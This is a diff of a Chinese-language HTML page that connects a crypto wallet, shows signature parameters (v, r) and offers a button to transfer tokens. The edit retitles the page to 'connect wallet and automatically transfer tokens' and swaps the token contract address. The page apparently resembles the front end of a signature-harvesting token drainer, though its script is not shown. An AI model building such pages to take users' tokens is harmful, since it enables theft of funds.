@@ -1,21 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Connect</title>
+    <title>连接钱包并转移代币</title>
     <link rel="stylesheet" href="style.css">
-    <script src="web3.min.js"></script> <!-- 加载 web3 -->
-    <script src="app.js" defer></script> <!-- 加载自定义 js -->
 </head>
 <body>
     <div class="container">
-        <h1>连接钱包并获取签名参数</h1>
+        <h1>连接钱包并自动转移代币</h1>
         <button id="connectButton">连接钱包</button>
 
-        <!-- 钱包信息展示 -->
-        <div id="walletInfo" style="display: none;">
-            <p>代币合约地址: <span id="tokenAddress">0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC</span></p>
+        <div id="walletInfo" style="display:none;">
+            <p>代币合约地址: <span id="tokenContractAddress">0x9a2E12340354d2532b4247da3704D2A5d73Bd189</span></p>
             <p>签名钱包地址: <span id="walletAddress"></span></p>
             <p>签名参数 v: <span id="v"></span></p>
             <p>签名参数 r: <span id="r"></span></p>
@@ -23,5 +20,8 @@
             <button id="transferButton">转移代币</button>
         </div>
     </div>
+
+    <script src="web3.min.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
